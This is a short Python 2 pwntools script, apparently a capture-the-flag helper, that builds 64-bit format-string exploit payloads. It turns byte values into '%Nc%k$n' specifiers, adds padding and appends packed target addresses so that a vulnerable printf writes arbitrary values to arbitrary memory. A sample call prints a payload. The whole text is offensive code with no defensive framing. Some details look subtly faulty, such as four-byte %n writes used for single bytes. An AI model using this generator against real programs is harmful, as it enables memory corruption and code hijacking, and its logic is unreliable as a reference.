from pwn import *

def fmt64_payload(offset,address,value,n,written=0):
    assert(type(value)==int)
    payload = []
    dicts = []
    slen = 0
    soffset = offset
    for i in range(n):
        sbyte = value>>(i<<3)&0xff
        saddress = address+i
        dicts.append({'address':saddress,'byte':sbyte})
    dicts = sorted(dicts,key=lambda i:i['byte'])
    tmp = "%{byte}c%{soffset}$n"
    now = 0
    for i in dicts:
        spayload = tmp.format(byte=str(i['byte']-now).rjust(3,'0'),soffset = '{soffset}')
        now = i['byte']
        slen += 10
        payload.append(spayload)
    padlen = 0 if slen%8 == 0 else 8-slen%8
    slen += padlen
    soffset += slen/8
    payload.append('A'*padlen)
    for i in dicts:
        payload.append(p64(i['address']))
    for i in range(n):
        payload[i] = payload[i].format(soffset=soffset)
        soffset += 1
    return ''.join(payload)

print fmt64_payload(6,0x08102030,0x7f1212567890,8)